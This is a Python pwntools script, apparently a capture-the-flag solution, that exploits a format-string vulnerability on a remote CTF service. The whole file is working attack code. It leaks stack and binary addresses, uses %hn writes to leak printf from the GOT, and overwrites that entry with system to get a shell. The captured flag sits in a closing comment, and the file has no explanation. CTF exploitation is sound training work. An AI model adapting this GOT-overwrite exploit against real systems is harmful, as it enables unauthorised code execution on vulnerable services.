#!/usr/bin/python

from pwn import *

host = 'csie.ctf.tw'
port = 10130


r = remote(host, port)

total_amount = 0
def fmt_hhn(prev, target, adr):
    global total_amount
    total_amount = ((target - prev) & 0xff)
    return "%" + str((target - prev) & 0xff) + "c%" + str(adr) + "$hhn"

def fmt_hn(prev, target, adr):
    global total_amount
    total_amount = ((target - prev) & 0xffff)
    return "%" + str((target - prev) & 0xffff) + "c%" + str(adr) + "$hn"

system_base = 0x000000000004f440
libc_start_main = 0x21ab0
printf_base = 0x0000000000064e80
printf_got = 0x0000000000200da8


payload = '%7$p'
r.sendline(payload)
x = r.recvuntil('\n').strip()
text_base = int(x, 16) & 0xfffffffffffff000
print ('text_base : ', hex(text_base))
printf_got += text_base
print ('printf_got : ', hex(printf_got))

payload = '%6$p'
r.sendline(payload)
x = r.recvuntil('\n').strip()
stack = int(x, 16) + 0x30
print ('targeted stack : ', hex(stack))
for i in range(3):
    payload = fmt_hn(0, (stack + i*2) & 0xffff , 13)
    r.sendline(payload)
    r.recvn(total_amount+1)
    payload = fmt_hn(0, (printf_got >> (i * 16)) & 0xffff, 0x27)
    r.sendline(payload)
    r.recvn(total_amount+1)
for i in range(3):
    payload = fmt_hn(0, (stack + 8 + i*2) & 0xffff , 13)
    r.sendline(payload)
    r.recvn(total_amount+1)
    payload = fmt_hn(0, ((printf_got + 2) >> (i * 16)) & 0xffff, 0x27)
    r.sendline(payload)
    r.recvn(total_amount+1)

payload = '%14$s'
r.sendline(payload)
x = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
print ('printf : ', hex(x))
system = x - printf_base + system_base
print ('system : ', hex(system))

payload = fmt_hn(0, (system) & 0xffff, 14)
need = total_amount
payload += fmt_hn(system & 0xffff, (system >> 16) & 0xffff, 15)
r.sendline(payload)
r.recvn(total_amount + need)

r.interactive()

#FLAG{fmmmmmmmmmmmmmmmmmtttt7t7t7t77t7tt}
